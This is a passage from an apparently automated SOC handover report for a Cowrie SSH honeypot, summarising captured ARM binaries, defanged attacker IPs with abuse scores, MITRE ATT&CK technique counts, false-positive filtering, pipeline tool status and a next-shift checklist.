| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `64.236.154[.]149` | US | Microsoft Limited | **100** ⚠️ | 2 |
| `61.240.156[.]16` | CN | China Unicom | **100** ⚠️ | 50 |
| `192.42.116[.]112` | NL | TOR EXIT AND MORE | **100** ⚠️ | 50 |
| `154.83.196[.]237` | RU | UCLOUD INFORMATION TECHNOLOGY HK LIMITED | **100** ⚠️ | 50 |
| `46.101.137[.]127` | DE | DigitalOcean, LLC | **100** ⚠️ | 3 |
| `66.108.198[.]5` | US | Charter Communications Inc | **100** ⚠️ | 9 |
| `192.42.116[.]100` | NL | TOR EXIT AND MORE | **100** ⚠️ | 50 |
| `132.145.122[.]251` | JP | Oracle Public Cloud | **100** ⚠️ | 14 |
| `220.154.131[.]135` | CN | China Telecom Group Corporation Qingdao Branch | **100** ⚠️ | 7 |
| `43.227.185[.]238` | IN | CUREMED SOLUTIONS PRIVATE LIMITED | **100** ⚠️ | 48 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 270 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 129 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 81 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 41 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 40 |

---

## 🔕 False Positive Summary (79 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 27 |
| AbuseIPDB score 12 below threshold 25 | 2 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 4 |
| AbuseIPDB score 5 below threshold 25 | 34 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 11 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 431 cases |
| Tool 34  | Credential Extractor        | ✅ 216 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 10 fingerprints |
| Tool 36  | Command Clustering          | ✅ 6 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 57 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 79 filtered (18.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 46 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 26 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 81 priority case(s) shown individually · 23 recon entry/entries in table (11 group(s) consolidating 259 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-06T17:45:31Z_
